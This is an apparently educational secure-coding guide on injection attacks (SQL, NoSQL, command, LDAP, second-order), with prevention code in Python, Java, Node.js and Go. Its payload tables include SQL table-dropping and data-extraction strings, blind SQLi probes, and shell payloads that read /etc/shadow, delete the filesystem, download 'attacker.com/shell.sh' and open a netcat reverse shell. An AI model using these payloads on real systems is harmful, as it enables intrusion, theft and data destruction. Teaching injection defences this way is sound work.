---
title: "Injection Attacks"
weight: 2
---

## What Is Injection?

Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The interpreter cannot distinguish between intended instructions and injected instructions. This has been the most devastating class of web vulnerability for over two decades.

The root cause is always the same: **string concatenation of user input into a structured language** (SQL, shell, LDAP, NoSQL query).

---

## SQL Injection

### How It Works

The application builds a SQL query by concatenating user input directly:

```python
# VULNERABLE — never do this
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

An attacker submits:

```text
username: admin' --
password: anything
```

The resulting query:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

Everything after `--` is a SQL comment. The password check is bypassed entirely.

### Classic Payloads

| Payload | Effect |
|---------|--------|
| `' OR '1'='1` | Always-true condition — returns all rows |
| `' OR '1'='1' --` | Bypasses remaining conditions |
| `'; DROP TABLE users; --` | Destroys the table (if permissions allow) |
| `' UNION SELECT username, password FROM users --` | Extracts data from another table |
| `' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables --` | Enumerates database schema |

### Blind SQL Injection

When the application does not display query results, attackers extract data one bit at a time:

```text
# Boolean-based: different response for true vs false
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --

# Time-based: response delay reveals true/false
' AND IF(1=1, SLEEP(5), 0) --
```

### Prevention: Parameterised Queries

The **only** reliable defence against SQL injection is parameterised queries (prepared statements). The database driver sends the query structure and the values separately — they are never concatenated.

**Python (psycopg2):**

```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password_hash)
)
```

**Java (JDBC):**

```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, passwordHash);
ResultSet rs = stmt.executeQuery();
```

**Node.js (pg):**

```javascript
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [username, passwordHash]
);
```

**Go (database/sql):**

```go
row := db.QueryRowContext(ctx,
    "SELECT id, username FROM users WHERE username = $1 AND password = $2",
    username, passwordHash,
)
```

### ORM Safety

ORMs generally use parameterised queries by default, but **raw query methods** are still vulnerable:

```python
# Django — SAFE (parameterised)
User.objects.filter(username=username)

# Django — VULNERABLE (raw SQL with string formatting)
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")

# Django — SAFE (raw SQL with parameters)
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])
```

---

## NoSQL Injection

NoSQL databases (MongoDB, CouchDB) are not immune to injection. The attack vector shifts from SQL strings to JSON operators.

### MongoDB Operator Injection

```javascript
// Vulnerable Express.js handler
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
  });
});
```

An attacker sends:

```json
{
  "username": "admin",
  "password": { "$ne": "" }
}
```

The query becomes: *find a user named `admin` whose password is not empty* — which matches the admin account.

### Other NoSQL Payloads

| Payload | Effect |
|---------|--------|
| `{ "$gt": "" }` | Matches any non-empty value |
| `{ "$regex": ".*" }` | Matches everything |
| `{ "$where": "this.password.length > 0" }` | Server-side JavaScript execution |

### Prevention

```javascript
// 1. Validate types — reject objects where strings are expected
const username = typeof req.body.username === 'string' ? req.body.username : '';
const password = typeof req.body.password === 'string' ? req.body.password : '';

// 2. Use a schema validation library
import { z } from 'zod';
const LoginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(200),
});
const parsed = LoginSchema.parse(req.body);
```

---

## Command Injection

Occurs when user input is passed to a system shell.

### How It Works

```python
import os

# VULNERABLE
filename = request.args.get('file')
os.system(f"cat /var/log/{filename}")
```

Attacker submits:

```text
file=access.log; rm -rf /
```

Resulting command: `cat /var/log/access.log; rm -rf /`

### Common Payloads

| Payload | Mechanism |
|---------|-----------|
| `; ls /etc/passwd` | Command separator |
| `&& cat /etc/shadow` | Logical AND — runs if previous succeeds |
| `\|\| wget attacker.com/shell.sh` | Logical OR — runs if previous fails |
| `` `id` `` | Backtick substitution |
| `$(whoami)` | Command substitution |
| `\| nc attacker.com 4444 -e /bin/sh` | Pipe to reverse shell |

### Prevention

**1. Avoid shell commands entirely** — use language-native APIs:

```python
# VULNERABLE
os.system(f"convert {input_file} {output_file}")

# SAFE — use subprocess with list arguments (no shell)
import subprocess
subprocess.run(["convert", input_file, output_file], check=True)
```

**2. If you must use a shell, use allowlists:**

```python
import re

ALLOWED_FILENAME = re.compile(r'^[a-zA-Z0-9_\-]+\.log$')

if not ALLOWED_FILENAME.match(filename):
    raise ValueError("Invalid filename")
```

**Java — use ProcessBuilder (no shell):**

```java
ProcessBuilder pb = new ProcessBuilder("convert", inputFile, outputFile);
pb.redirectErrorStream(true);
Process process = pb.start();
```

**Go — use exec.Command (no shell):**

```go
cmd := exec.CommandContext(ctx, "convert", inputFile, outputFile)
output, err := cmd.CombinedOutput()
```

---

## LDAP Injection

Targets applications that query LDAP directories (Active Directory, OpenLDAP).

### How It Works

```java
// VULNERABLE
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
ctx.search("ou=users,dc=example,dc=com", filter, controls);
```

Attacker submits:

```text
username: admin)(|(uid=*
password: anything
```

Resulting filter: `(&(uid=admin)(|(uid=*)(userPassword=anything))` — matches any user.

### Prevention

1. **Escape special LDAP characters** before building filters:

```java
// Characters to escape: \ * ( ) NUL
public static String escapeLdap(String input) {
    return input
        .replace("\\", "\\5c")
        .replace("*",  "\\2a")
        .replace("(",  "\\28")
        .replace(")",  "\\29")
        .replace("\0", "\\00");
}
```

2. **Use parameterised LDAP APIs** when available (e.g., Spring LDAP `LdapQueryBuilder`).

---

## Second-Order Injection

First-order injection exploits the input immediately. **Second-order injection** stores malicious input and exploits it later when the stored data is used in a different query.

```text
1. Attacker registers username:  admin'--
2. Application stores it safely (parameterised INSERT)
3. Later, a different part of the app uses the stored username
   in a raw SQL query → injection triggers
```

### Prevention

Parameterise **every** query, not just those that directly handle user input. Data from your own database is not inherently safe — it may contain previously stored malicious input.

---

## Defence Summary

| Attack | Primary Defence | Secondary Defence |
|--------|----------------|-------------------|
| SQL Injection | Parameterised queries | Input validation, WAF rules, least-privilege DB accounts |
| NoSQL Injection | Type validation (reject objects) | Schema validation (Zod, Joi), disable `$where` |
| Command Injection | Avoid shells; use language APIs | Allowlist input patterns, sandboxing |
| LDAP Injection | Escape special characters | Parameterised LDAP queries, input validation |
| Second-Order | Parameterise all queries | Treat all stored data as untrusted |

---

## Key Takeaways

- **All injection attacks share one root cause:** concatenating untrusted input into structured queries or commands.
- **Parameterised queries** are the only reliable defence against SQL injection — escaping and sanitising are incomplete solutions.
- **NoSQL databases are not immune** — MongoDB operator injection (`$ne`, `$gt`, `$regex`) bypasses authentication when types are not validated.
- **Command injection** is prevented by avoiding shell invocation entirely — use `subprocess.run([...])`, `ProcessBuilder`, or `exec.Command` with argument lists.
- **Second-order injection** exploits stored data in later queries — parameterise every query, even those reading from your own database.
- **Defence in depth** combines parameterised queries with input validation, least-privilege database accounts, and WAF rules.
